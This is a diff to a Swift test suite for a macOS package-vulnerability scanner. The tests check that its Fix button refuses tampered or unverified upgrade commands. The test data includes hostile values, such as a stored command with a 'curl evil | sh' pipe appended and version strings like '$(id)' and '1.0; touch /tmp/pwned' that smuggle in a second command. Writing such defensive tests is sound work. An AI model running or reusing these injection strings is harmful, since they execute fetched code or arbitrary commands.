@@ -10,13 +10,14 @@ let home = "/Users/ana"
 /// A finding whose command UpgradeCommand made from these inputs, as FindingBuilder makes them.
 func fixable(_ origin: Origin, _ name: String, _ ecosystem: Ecosystem? = .npm, installed: String = "1.0.0", fixed: String? = "2.0.0",
              malicious: Bool = false, subject: Finding.Subject? = nil, component: String? = nil, id: String? = nil) -> Finding {
-    let inputs = UpgradeCommand.Inputs(origin: origin, name: name, ecosystem: ecosystem, target: malicious ? nil : fixed, malicious: malicious)
-    let command = UpgradeCommand.advice(inputs, home: home).command
+    let upgrade = malicious ? nil : fixed.map { Fixture.fix($0, above: installed) }
+    let inputs = UpgradeCommand.Inputs(origin: origin, name: name, ecosystem: ecosystem, target: upgrade, malicious: malicious)
+    let advice = UpgradeCommand.advice(inputs, home: home)
     return Finding(id: id ?? "pkg|\(name)|\(installed)", group: malicious ? .malicious : .criticalHigh,
                    subject: subject ?? .package(ecosystem: ecosystem ?? .npm, name: name), title: name, component: component,
-                   installedVersion: installed, fixedVersion: malicious ? nil : fixed, severity: .high, advisoryIDs: [], flawCount: 1,
+                   installedVersion: installed, upgrade: upgrade, severity: .high, advisoryIDs: [], flawCount: 1,
                    exploited: false, malicious: malicious, note: nil, bigIssue: nil, origins: [origin],
-                   pageURL: URL(string: "https://verificationalliance.org/")!, upgradeCommand: command, verification: .none, grade: nil,
+                   pageURL: URL(string: "https://verificationalliance.org/")!, advice: advice, verification: .none, grade: nil,
                    commandInputs: inputs)
 }
 
@@ -81,6 +82,67 @@ func ok(_ r: Result<FixPlan, FixPlan.Refusal>, sourceLocation: SourceLocation = 
         #expect(f.upgradeCommand == nil && f.commandInputs == nil && f.fixedVersion == nil)
         #expect(f.note?.contains("does not accept as a version") == true)
         #expect(plan(f) == .failure(.noCommand))
+    }
+}
+
+// MARK: - A command's version is one the core checked
+
+@Suite struct FixTests {
+    static let none = UpgradeCommand.Advice(command: nil, note: "No checked fixed version yet; see the site.")
+
+    func advice(_ origin: Origin, _ name: String = "x", _ ecosystem: Ecosystem? = .npm, target: CheckedUpgrade? = nil,
+                malicious: Bool = false) -> UpgradeCommand.Advice {
+        UpgradeCommand.advice(for: origin, name: name, ecosystem: ecosystem, target: target, malicious: malicious, home: home)
+    }
+
+    /// npm's `@latest` and go's: without a version the core checked, an npm global and a project's go.sum give no command,
+    /// and say why. With one, the command names it.
+    @Test func noLatestCommandWithoutACheckedTarget() {
+        let npm = Origin.npmGlobal(npm: "/opt/homebrew/bin/npm"), goSum = Origin.folder(root: "/p", lockfile: "/p/go.sum", direct: false)
+        #expect(advice(npm) == Self.none)
+        #expect(advice(goSum, "golang.org/x/net", .go) == Self.none)
+        #expect(advice(npm, target: Fixture.fix("2.0.0")).command == "npm install -g x@2.0.0")
+        #expect(advice(goSum, "golang.org/x/net", .go, target: Fixture.fix("0.33.0")).command == "cd /p && go get golang.org/x/net@v0.33.0")
+        // a removal names no version; a malicious module comes out of go.mod (it was `go get …@latest`)
+        #expect(advice(npm, malicious: true).command == "npm uninstall -g x")
+        #expect(advice(Origin.folder(root: "/p", lockfile: "/p/go.sum", direct: true), "evil.example/m", .go, malicious: true).command
+                == "cd /p && go get evil.example/m@none")
+        #expect(advice(goSum, "evil.example/m", .go, malicious: true).command == nil)
+    }
+
+    /// Every other command that names no version lets a registry pick it too: none without a checked version. Homebrew's
+    /// own upgrade stays, since Homebrew picks from releases the person already takes from it.
+    @Test func noCommandLetsARegistryPickTheVersion() {
+        let env = CondaEnvironment(prefix: "/Users/ana/miniforge3", name: "base", named: true, tool: .conda, python: "3.11.5")
+        let registry: [(Origin, Ecosystem?)] = [
+            (.cargoInstall, .crates), (.gem(gem: "/usr/bin/gem"), .rubygems), (.gem(gem: "/opt/homebrew/opt/ruby/bin/gem"), .rubygems),
+            (.conda(env: env), .pypi), (.macports(port: "x"), nil), (.nix(profile: NixProfile(path: "/Users/ana/.nix-profile", style: .profile, shared: false), element: "x"), nil),
+        ] + [("package-lock.json", Ecosystem.npm), ("yarn.lock", .npm), ("pnpm-lock.yaml", .npm), ("poetry.lock", .pypi), ("Pipfile.lock", .pypi),
+             ("Cargo.lock", .crates), ("Gemfile.lock", .rubygems), ("composer.lock", .packagist)].flatMap { file, eco in
+            [true, false].map { (Origin.folder(root: "/p", lockfile: "/p/" + file, direct: $0), Optional(eco)) }
+        }
+        for (origin, eco) in registry {
+            let a = advice(origin, "x", eco)
+            #expect(a.command == nil && (a.note == nil || a.note == Self.none.note), "\(origin): \(a)")
+            #expect(advice(origin, "x", eco, target: Fixture.fix("2.0.0")).command != nil || advice(origin, "x", eco, target: Fixture.fix("2.0.0")).note != nil,
+                    "\(origin)")
+        }
+        // Homebrew picks: kept without a checked version
+        #expect(advice(.homebrewFormula(name: "nginx"), "nginx", nil).command == "brew upgrade nginx")
+        #expect(advice(.homebrewCask(token: "slack"), "slack", nil).command == "brew upgrade --cask slack")
+        #expect(advice(.electronApp(name: "Slack", bundlePath: "/Applications/Slack.app", caskToken: "slack"), "electron").command
+                == "brew upgrade --cask slack")
+        #expect(advice(.pip(python: Fixture.homebrewPython, user: false, formula: "jupyterlab"), "six", .pypi).command == "brew upgrade jupyterlab")
+    }
+
+    /// A report saved with a command made without a checked version (0.5.1's `npm install -g x@latest`) is not one the
+    /// Fix button runs: the inputs no longer give that command.
+    @Test func aSavedLatestCommandIsNotRunAgain() {
+        let inputs = Fixture.savedInputs(origin: .npmGlobal(npm: "/opt/homebrew/bin/npm"), name: "lodash", ecosystem: .npm, target: nil, malicious: false)
+        var f = Fixture.saved(fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "lodash", installed: "4.17.20", fixed: "4.17.21"),
+                              ["upgradeCommand": "npm install -g lodash@latest", "fixedVersion": nil])
+        f.commandInputs = inputs
+        #expect(plan(f) == .failure(.notReproducible))
     }
 }
 
@@ -159,7 +221,7 @@ func ok(_ r: Result<FixPlan, FixPlan.Refusal>, sourceLocation: SourceLocation = 
         f.commandInputs = nil                                                  // a report saved before the button existed
         #expect(plan(f) == .failure(.notReproducible))
         f = fixable(.homebrewFormula(name: "nginx"), "nginx", nil)
-        f.upgradeCommand = "brew upgrade nginx; curl evil | sh"                 // a report changed on disk
+        f = Fixture.saved(f, ["upgradeCommand": "brew upgrade nginx; curl evil | sh"])     // a report changed on disk
         #expect(plan(f) == .failure(.notReproducible))
         f = fixable(.homebrewFormula(name: "nginx"), "nginx", nil)
         f.commandInputs?.origin = .homebrewFormula(name: "curl")                // inputs that make another command
@@ -175,8 +237,7 @@ func ok(_ r: Result<FixPlan, FixPlan.Refusal>, sourceLocation: SourceLocation = 
     }
 
     @Test func noButtonForAVersionThatIsNotOne() {
-        var f = fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "lodash", fixed: "4.17.21")
-        f.fixedVersion = "$(id)"
+        let f = Fixture.saved(fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "lodash", fixed: "4.17.21"), fixedVersion: "$(id)")
         #expect(plan(f) == .failure(.unsafeVersion))
         // inputs carrying a bad version (a report written by something else): the command quotes it, the plan refuses it
         let bad = fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "lodash", fixed: "1.0; touch /tmp/pwned")
@@ -478,7 +539,8 @@ func scriptPlan(_ command: String, id: String = "pkg|npm|left-pad|1.0.0", title:
                 (.cargoInstall, evil, "2.0.0", ["install", evil + "@2.0.0"]),
             ]
             for (origin, name, target, expected) in cases where !expected.isEmpty {
-                let inputs = UpgradeCommand.Inputs(origin: origin, name: name, ecosystem: nil, target: target, malicious: false)
+                // any target, as a report saved on disk may have one: what the command does with it is the point here
+                let inputs = Fixture.savedInputs(origin: origin, name: name, ecosystem: nil, target: target, malicious: false)
                 let command = try #require(UpgradeCommand.advice(inputs, home: home).command)
                 let id = "pkg|x|\(evil)|1.0"
                 let run = UUID()
@@ -499,7 +561,7 @@ func scriptPlan(_ command: String, id: String = "pkg|npm|left-pad|1.0.0", title:
             let folder = base.appendingPathComponent("p-" + UUID().uuidString).appendingPathComponent(evil.replacingOccurrences(of: "/", with: "_"))
             if (try? FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)) != nil {
                 let inputs = UpgradeCommand.Inputs(origin: .folder(root: folder.path, lockfile: folder.appendingPathComponent("package-lock.json").path, direct: true),
-                                                   name: "lodash", ecosystem: .npm, target: "4.18.1", malicious: false)
+                                                   name: "lodash", ecosystem: .npm, target: Fixture.fix("4.18.1"), malicious: false)
                 let command = try #require(UpgradeCommand.advice(inputs, home: home).command)
                 let run = UUID()
                 let dirs = FixDirectories(support: base.appendingPathComponent(run.uuidString))
@@ -667,6 +729,8 @@ final class SwitchableRunner: CommandRunner, @unchecked Sendable {
     final class Later: @unchecked Sendable {
         let lock = NSLock()
         var batch: Data?
+        /// nginx's project record in place of the fixture's.
+        var nginx: Data?
     }
 
     /// The recorded site, except that the batch answer can be changed after the scan.
@@ -679,13 +743,13 @@ final class SwitchableRunner: CommandRunner, @unchecked Sendable {
             case "/api/v1/state": return .init(status: 200, body: Fixture.data("api/state.json"))
             default:
                 let slug = String(path.dropFirst("/api/v1/project/".count))
+                if slug == "nginx", let record = later.lock.withLock({ later.nginx }) { return .init(status: 200, body: record) }
                 return (try? Data(contentsOf: Fixture.url("api/project-\(slug).json"))).map { .init(status: 200, body: $0) } ?? .init(status: 404, body: Data())
             }
         }
     }
 
-    func setUp() -> (OSVAKit.Scanner, SwitchableRunner, RecordedTransport, Later) {
-        let dir = temporaryDirectory()
+    func setUp(_ dir: URL = temporaryDirectory()) -> (OSVAKit.Scanner, SwitchableRunner, RecordedTransport, Later) {
         let runner = SwitchableRunner([:])
         runner.set(Self.brewKey, Self.nginx("1.30.2"))
         runner.set(Self.npmKey, Self.lodash("4.17.20"))
@@ -711,15 +775,36 @@ final class SwitchableRunner: CommandRunner, @unchecked Sendable {
         #expect(transport.requests.count == asked)                                  // the project's advisories came from the cache
     }
 
-    @Test func notFarEnoughIsStillAffectedUnderItsNewVersion() async throws {
+    @Test func notFarEnoughIsStillFoundUnderItsNewVersion() async throws {
         let (scanner, runner, _, _) = setUp()
         let report = await scanner.scan()
         let nginx = try #require(report.findings.first { $0.id == "brew|nginx|1.30.2" })
         runner.set(Self.brewKey, Self.nginx("1.30.5"))
         let (updated, outcome) = await scanner.recheck(nginx, in: report)
-        guard case let .stillAffected(now) = outcome else { Issue.record("\(outcome)"); return }
-        #expect(now.id == "brew|nginx|1.30.5" && now.fixedVersion == "1.30.7")
+        // nginx's record publishes no ranges: still likely affected, which is not checked (JavaTests has one still affected)
+        guard case let .notChecked(now) = outcome else { Issue.record("\(outcome)"); return }
+        #expect(now.id == "brew|nginx|1.30.5" && now.fixedVersion == "1.30.7" && now.group == .likely)
         #expect(updated.findings.filter { $0.title == "nginx" }.map(\.id) == ["brew|nginx|1.30.5"])
+    }
+
+    /// An upgrade that leaves every advisory with published ranges is not "fixed" while one exploited in the wild states
+    /// nothing; one that is only critical does not stop it.
+    @Test func aRecheckIsNeverFixedOverAnExploitedAdvisoryThatStatesNothing() async throws {
+        func recheck(_ unstated: String) async throws -> OSVAKit.Scanner.Recheck {
+            let (scanner, runner, _, later) = setUp()
+            later.lock.withLock {
+                later.nginx = Data(#"{"slug":"nginx","name":"nginx","recent":[{"id":"CVE-A","sev":"HIGH","ranges":[{"fixed":"1.30.7"}]},\#(unstated)]}"#.utf8)
+            }
+            let report = await scanner.scan()
+            let nginx = try #require(report.findings.first { $0.id == "brew|nginx|1.30.2" })
+            #expect(nginx.group == .criticalHigh && nginx.notChecked?.id == "CVE-S")
+            runner.set(Self.brewKey, Self.nginx("1.30.7_1"))
+            return await scanner.recheck(nginx, in: report).outcome
+        }
+        let exploited = try await recheck(#"{"id":"CVE-S","sev":"HIGH","kev":true,"ranges":null}"#)
+        guard case let .notChecked(now) = exploited else { Issue.record("\(exploited)"); return }
+        #expect(now.group == .reported && now.notChecked?.id == "CVE-S" && now.fixedVersion == nil)
+        #expect(try await recheck(#"{"id":"CVE-S","sev":"CRITICAL","ranges":null}"#) == .fixed(now: "1.30.7"))
     }
 
     @Test func aPackageIsAskedAboutAloneAndAfresh() async throws {
@@ -737,6 +822,81 @@ final class SwitchableRunner: CommandRunner, @unchecked Sendable {
         #expect(body == #"{"packages":[{"ecosystem":"npm","name":"lodash","platform":"macos","version":"4.17.21"}]}"#)
         #expect(updated.sent.distinctItems.contains("npm lodash 4.17.21 · macOS"))   // and it is in "What leaves your Mac"
         #expect(!updated.findings.contains { $0.title == "lodash" })
+    }
+
+    @Test func aRecheckThatFindsOnlyReportedFlawsSaysSo() async throws {
+        // the new version's flaw has no ranges and no fixed versions: reported, not checked; neither fixed nor a failure
+        let (scanner, runner, _, later) = setUp()
+        let report = await scanner.scan()
+        let lodash = try #require(report.findings.first { $0.title == "lodash" })
+        runner.set(Self.npmKey, Self.lodash("4.17.21"))
+        let answer = #"{"checked":1,"packages":[{"ecosystem":"npm","name":"lodash","version":"4.17.21","distinct_flaws":1,"flaws":[{"id":"CVE-R","severity":"HIGH"}]}]}"#
+        later.lock.withLock { later.batch = Data(answer.utf8) }
+        let (_, outcome) = await scanner.recheck(lodash, in: report)
+        guard case let .notChecked(now) = outcome else { Issue.record("\(outcome)"); return }
+        #expect(now.group == .reported && now.installedVersion == "4.17.21")
+        let made = FixOutcome.make(status: 0, before: lodash, recheck: outcome, homebrew: nil)
+        #expect(made == .notChecked("now 4.17.21") && made.text == "Still reported by the site; not checked: now 4.17.21")
+        #expect(!made.isResolved && !made.isProblem)
+        #expect(FixOutcome.make(ending: .exited(0), before: lodash, recheck: outcome, homebrew: nil) == .notChecked("now 4.17.21"))
+        #expect(FixOutcome.make(status: 1, before: lodash, recheck: outcome, homebrew: nil) == .failed(1))
+    }
+
+    /// lodash 4.17.20 fixed to 4.17.21, whose one flaw the answer after the fix gives as `flaw`: the re-check's outcome, the
+    /// finding before, and the report after.
+    func recheckToLodash4_17_21(answering flaw: String) async throws -> (OSVAKit.Scanner.Recheck, Finding, ScanReport) {
+        let (scanner, runner, _, later) = setUp()
+        let report = await scanner.scan()
+        let lodash = try #require(report.findings.first { $0.title == "lodash" })
+        runner.set(Self.npmKey, Self.lodash("4.17.21"))
+        let answer = #"{"checked":1,"packages":[{"ecosystem":"npm","name":"lodash","version":"4.17.21","distinct_flaws":1,"worst_severity":"HIGH","#
+            + #""advisories":["CVE-L"],"flaws":[\#(flaw)]}]}"#
+        later.lock.withLock { later.batch = Data(answer.utf8) }
+        let (updated, outcome) = await scanner.recheck(lodash, in: report)
+        return (outcome, lodash, updated)
+    }
+
+    /// A version the core finds clear is fixed, and Fix all counts it fixed: listed in Other with nothing to do, never
+    /// "Still affected".
+    func expectFixed(_ outcome: OSVAKit.Scanner.Recheck, before: Finding, after: ScanReport) throws {
+        #expect(outcome == .fixed(now: "4.17.21"), "\(outcome)")
+        let now = try #require(after.findings.first { $0.title == "lodash" })
+        #expect(now.group == .other && now.fixedVersion == nil && now.upgradeCommand == nil && !now.group.needsAction)
+        for made in [FixOutcome.make(status: 0, before: before, recheck: outcome, homebrew: nil),
+                     FixOutcome.make(ending: .exited(0), before: before, recheck: outcome, homebrew: nil)] {
+            #expect(made == .fixed(now: "4.17.21") && made.isResolved && !made.isProblem, "\(made)")
+        }
+    }
+
+    /// After a fix, a version whose every flaw lies outside its published ranges is fixed.
+    @Test func aRecheckThatFindsOnlyFlawsOutsideTheirRangesIsFixed() async throws {
+        let (outcome, before, after) = try await recheckToLodash4_17_21(
+            answering: #"{"id":"CVE-L","severity":"HIGH","ranges":[{"introduced":"5.0.0","fixed":"5.1.0"}],"fixed_in":["5.1.0"]}"#)
+        try expectFixed(outcome, before: before, after: after)
+        #expect(after.findings.first { $0.title == "lodash" }?.outsideItsRanges == true)
+    }
+
+    /// After a fix, a version whose every flaw is of another platform is fixed, even one inside that flaw's ranges there.
+    @Test func aRecheckThatFindsOnlyAnotherPlatformsFlawsIsFixed() async throws {
+        let (outcome, before, after) = try await recheckToLodash4_17_21(
+            answering: #"{"id":"CVE-L","severity":"HIGH","platform":"windows","ranges":[{"fixed":"4.17.22"}],"fixed_in":["4.17.22"]}"#)
+        try expectFixed(outcome, before: before, after: after)
+        #expect(after.findings.first { $0.title == "lodash" }?.onlyElsewhere == true)
+    }
+
+    @Test func aRecheckKeepsItsAnswerWhereScansReadThem() async throws {
+        let dir = temporaryDirectory()
+        let (scanner, runner, _, later) = setUp(dir)
+        let report = await scanner.scan()
+        let lodash = try #require(report.findings.first { $0.title == "lodash" })
+        runner.set(Self.npmKey, Self.lodash("4.17.21"))
+        later.lock.withLock { later.batch = Data(#"{"checked":1,"packages":[]}"#.utf8) }
+        _ = await scanner.recheck(lodash, in: report)
+        let asked = try #require(PrivacyFilter(index: Fixture.index).approve([InstalledPackage(ecosystem: .npm, name: "lodash", version: "4.17.21",
+                                                                                                origin: .npmGlobal(npm: Self.npm))]).approved.keys.first)
+        let cache = Storage(directory: dir).cache
+        #expect(cache.read("batch-v2", asked.cacheKey, maxAge: 3600) != nil)
+        #expect(!FileManager.default.fileExists(atPath: cache.directory.appendingPathComponent("batch").path))
     }
 
     @Test func aPackageThatIsGoneIsRemoved() async throws {
